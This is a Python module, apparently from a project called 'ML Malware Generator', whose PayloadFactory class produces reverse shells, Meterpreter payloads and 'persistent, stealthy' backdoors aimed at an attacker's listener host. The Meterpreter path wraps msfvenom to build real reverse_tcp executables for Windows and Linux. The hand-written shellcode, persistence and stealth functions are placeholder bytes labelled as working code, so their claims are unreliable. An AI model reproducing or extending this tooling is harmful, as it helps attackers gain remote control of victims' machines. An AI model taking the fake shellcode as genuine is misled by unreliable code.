"""
ML Malware Generator - Payload Factory
Generates different types of payloads (reverse shells, meterpreter, backdoors, etc.)
"""
import os
import subprocess
import tempfile
from typing import Dict, Optional, Tuple
from pathlib import Path
import struct

from config.settings import payload_config, OUTPUT_DIR
from utils.logger import get_logger
from utils.crypto import get_crypto

logger = get_logger()
crypto = get_crypto()


class PayloadFactory:
    """Factory for generating various payload types"""
    
    def __init__(self):
        self.output_dir = OUTPUT_DIR / "payloads"
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def generate_reverse_shell_tcp(
        self,
        lhost: str,
        lport: int,
        target_os: str = "windows",
        architecture: str = "x64",
    ) -> Tuple[bytes, Dict]:
        """
        Generate TCP reverse shell payload
        
        Args:
            lhost: Listener host IP
            lport: Listener port
            target_os: Target OS (windows, linux, android)
            architecture: Target architecture (x86, x64)
        
        Returns:
            (payload_bytes, metadata)
        """
        logger.info(f"Generating TCP reverse shell for {target_os}/{architecture}")
        
        metadata = {
            "type": "reverse_shell_tcp",
            "lhost": lhost,
            "lport": lport,
            "target_os": target_os,
            "architecture": architecture,
        }
        
        # Generate shellcode based on target
        if target_os == "windows" and architecture == "x64":
            payload = self._generate_windows_reverse_shell_x64(lhost, lport)
        elif target_os == "windows" and architecture == "x86":
            payload = self._generate_windows_reverse_shell_x86(lhost, lport)
        elif target_os == "linux" and architecture == "x64":
            payload = self._generate_linux_reverse_shell_x64(lhost, lport)
        else:
            raise ValueError(f"Unsupported combination: {target_os}/{architecture}")
        
        logger.success(f"Generated reverse shell payload ({len(payload)} bytes)")
        return payload, metadata
    
    def _generate_windows_reverse_shell_x64(self, lhost: str, lport: int) -> bytes:
        """Generate Windows x64 reverse shell shellcode"""
        # Simplified shellcode template (in real implementation, use proper shellcode)
        # This is a placeholder - real shellcode would be much more complex
        
        # Convert IP to bytes
        ip_parts = [int(x) for x in lhost.split('.')]
        ip_bytes = bytes(ip_parts)
        
        # Convert port to bytes (network byte order)
        port_bytes = struct.pack('>H', lport)
        
        # Placeholder shellcode structure
        shellcode = b'\x90' * 16  # NOP sled
        shellcode += b'\x48\x31\xc0'  # xor rax, rax (placeholder)
        shellcode += ip_bytes
        shellcode += port_bytes
        shellcode += b'\xc3'  # ret
        
        return shellcode
    
    def _generate_windows_reverse_shell_x86(self, lhost: str, lport: int) -> bytes:
        """Generate Windows x86 reverse shell shellcode"""
        ip_parts = [int(x) for x in lhost.split('.')]
        ip_bytes = bytes(ip_parts)
        port_bytes = struct.pack('>H', lport)
        
        shellcode = b'\x90' * 16
        shellcode += b'\x31\xc0'  # xor eax, eax
        shellcode += ip_bytes
        shellcode += port_bytes
        shellcode += b'\xc3'
        
        return shellcode
    
    def _generate_linux_reverse_shell_x64(self, lhost: str, lport: int) -> bytes:
        """Generate Linux x64 reverse shell shellcode"""
        ip_parts = [int(x) for x in lhost.split('.')]
        ip_bytes = bytes(ip_parts)
        port_bytes = struct.pack('>H', lport)
        
        shellcode = b'\x90' * 16
        shellcode += b'\x48\x31\xc0'  # xor rax, rax
        shellcode += ip_bytes
        shellcode += port_bytes
        shellcode += b'\xc3'
        
        return shellcode
    
    def generate_meterpreter_payload(
        self,
        lhost: str,
        lport: int,
        target_os: str = "windows",
        architecture: str = "x64",
        format: str = "exe",
    ) -> Tuple[bytes, Dict]:
        """
        Generate Meterpreter payload using msfvenom
        
        Args:
            lhost: Listener host
            lport: Listener port
            target_os: Target OS
            architecture: Target architecture
            format: Output format (exe, dll, elf, etc.)
        
        Returns:
            (payload_bytes, metadata)
        """
        logger.info(f"Generating Meterpreter payload for {target_os}/{architecture}")
        
        # Determine msfvenom payload name
        payload_map = {
            ("windows", "x64", "exe"): "windows/x64/meterpreter/reverse_tcp",
            ("windows", "x86", "exe"): "windows/meterpreter/reverse_tcp",
            ("linux", "x64", "elf"): "linux/x64/meterpreter/reverse_tcp",
            ("linux", "x86", "elf"): "linux/x86/meterpreter/reverse_tcp",
        }
        
        payload_name = payload_map.get((target_os, architecture, format))
        if not payload_name:
            raise ValueError(f"Unsupported meterpreter configuration")
        
        # Try to use msfvenom if available
        try:
            with tempfile.NamedTemporaryFile(delete=False, suffix=f'.{format}') as tmp:
                tmp_path = tmp.name
            
            cmd = [
                "msfvenom",
                "-p", payload_name,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", format,
                "-o", tmp_path,
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
            )
            
            if result.returncode == 0:
                with open(tmp_path, 'rb') as f:
                    payload = f.read()
                
                os.unlink(tmp_path)
                
                metadata = {
                    "type": "meterpreter",
                    "payload_name": payload_name,
                    "lhost": lhost,
                    "lport": lport,
                    "format": format,
                    "generated_with": "msfvenom",
                }
                
                logger.success(f"Generated Meterpreter payload ({len(payload)} bytes)")
                return payload, metadata
            else:
                logger.warning(f"msfvenom failed: {result.stderr}")
                raise Exception("msfvenom generation failed")
        
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception) as e:
            logger.warning(f"Could not use msfvenom: {e}")
            logger.info("Falling back to template-based generation")
            
            # Fallback: use template
            return self._generate_meterpreter_template(lhost, lport, target_os, architecture, format)
    
    def _generate_meterpreter_template(
        self,
        lhost: str,
        lport: int,
        target_os: str,
        architecture: str,
        format: str,
    ) -> Tuple[bytes, Dict]:
        """Generate meterpreter-like payload from template"""
        # Simplified template-based generation
        logger.info("Using template-based meterpreter generation")
        
        # Generate basic reverse shell as base
        payload, _ = self.generate_reverse_shell_tcp(lhost, lport, target_os, architecture)
        
        # Add meterpreter-like stub
        payload = b'MZ' + payload  # PE header for Windows
        
        metadata = {
            "type": "meterpreter_template",
            "lhost": lhost,
            "lport": lport,
            "format": format,
            "generated_with": "template",
        }
        
        return payload, metadata
    
    def generate_backdoor(
        self,
        lhost: str,
        lport: int,
        target_os: str = "windows",
        persistence: bool = True,
        stealth: bool = True,
    ) -> Tuple[bytes, Dict]:
        """
        Generate persistent backdoor
        
        Args:
            lhost: C2 server host
            lport: C2 server port
            target_os: Target OS
            persistence: Enable persistence mechanisms
            stealth: Enable stealth features
        
        Returns:
            (payload_bytes, metadata)
        """
        logger.info(f"Generating backdoor for {target_os} (persistence={persistence}, stealth={stealth})")
        
        # Start with reverse shell
        payload, metadata = self.generate_reverse_shell_tcp(lhost, lport, target_os)
        
        # Add persistence code
        if persistence:
            persistence_code = self._generate_persistence_code(target_os)
            payload = persistence_code + payload
            metadata["persistence"] = True
        
        # Add stealth features
        if stealth:
            stealth_code = self._generate_stealth_code(target_os)
            payload = stealth_code + payload
            metadata["stealth"] = True
        
        metadata["type"] = "backdoor"
        
        logger.success(f"Generated backdoor payload ({len(payload)} bytes)")
        return payload, metadata
    
    def _generate_persistence_code(self, target_os: str) -> bytes:
        """Generate persistence mechanism code"""
        if target_os == "windows":
            # Registry run key persistence (simplified)
            return b'\x90' * 8 + b'PERSIST'
        elif target_os == "linux":
            # Cron job persistence (simplified)
            return b'\x90' * 8 + b'CRON'
        return b''
    
    def _generate_stealth_code(self, target_os: str) -> bytes:
        """Generate stealth features code"""
        # Anti-debugging, VM detection, etc. (simplified)
        return b'\x90' * 8 + b'STEALTH'
    
    def save_payload(
        self,
        payload: bytes,
        filename: str,
        metadata: Optional[Dict] = None,
    ) -> Path:
        """Save payload to file"""
        output_path = self.output_dir / filename
        
        with open(output_path, 'wb') as f:
            f.write(payload)
        
        # Save metadata
        if metadata:
            import json
            metadata_path = output_path.with_suffix('.json')
            with open(metadata_path, 'w') as f:
                json.dump(metadata, f, indent=2)
        
        logger.info(f"Saved payload to {output_path}")
        return output_path


# Global payload factory instance
_payload_factory = None


def get_payload_factory() -> PayloadFactory:
    """Get global payload factory instance"""
    global _payload_factory
    if _payload_factory is None:
        _payload_factory = PayloadFactory()
    return _payload_factory
